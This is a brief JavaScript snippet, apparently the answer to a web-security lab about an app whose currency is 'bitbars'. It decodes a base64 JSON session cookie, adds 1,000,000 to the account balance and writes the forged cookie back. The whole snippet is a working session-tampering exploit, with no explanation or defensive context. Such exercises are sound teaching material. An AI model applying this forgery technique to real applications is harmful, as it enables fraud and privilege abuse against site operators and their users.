function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
}
cookie = JSON.parse(atob(getCookie("session")))
cookie.account.bitbars += 1000000
document.cookie = "session=" + btoa(JSON.stringify(cookie))